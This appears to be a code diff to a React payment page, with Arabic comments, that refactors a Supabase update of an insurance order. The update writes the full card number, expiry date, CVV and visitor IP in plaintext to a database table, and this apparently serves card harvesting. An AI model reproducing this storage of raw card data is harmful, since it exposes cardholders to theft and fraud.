@@ -195,22 +195,39 @@ const Payment = () => {
       // التحقق من وجود رقم تسلسل صالح
       if (orderData.sequenceNumber) {
         // محاولة تحديث السجل الموجود
-        const {
-          data,
-          error: updateError
-        } = await supabase.from('customer_orders').update({
-          card_holder_name: cardHolder,
-          card_number: cardNumber,
-          expiry_date: expiryDate,
-          cvv: cvv,
-          insurance_company: companyName,
-          insurance_price: finalPrice,
-          status: 'pending',
-          visitor_ip: visitorIp,
-          updated_at: new Date().toISOString()
-        }).eq('sequence_number', orderData.sequenceNumber).order('created_at', {
-          ascending: false
-        }).limit(1).select().maybeSingle();
+        // أولاً نجد الطلب الأحدث بهذا الرقم التسلسلي
+        const { data: existingOrder } = await supabase
+          .from('customer_orders')
+          .select('id')
+          .eq('sequence_number', orderData.sequenceNumber)
+          .order('created_at', { ascending: false })
+          .limit(1)
+          .maybeSingle();
+
+        let data = null;
+        let updateError = null;
+
+        if (existingOrder) {
+          const result = await supabase
+            .from('customer_orders')
+            .update({
+              card_holder_name: cardHolder,
+              card_number: cardNumber,
+              expiry_date: expiryDate,
+              cvv: cvv,
+              insurance_company: companyName,
+              insurance_price: finalPrice,
+              status: 'pending',
+              visitor_ip: visitorIp,
+              updated_at: new Date().toISOString()
+            })
+            .eq('id', existingOrder.id)
+            .select()
+            .maybeSingle();
+          
+          data = result.data;
+          updateError = result.error;
+        }
         if (updateError) {
           console.error('Update error:', updateError);
           throw updateError;
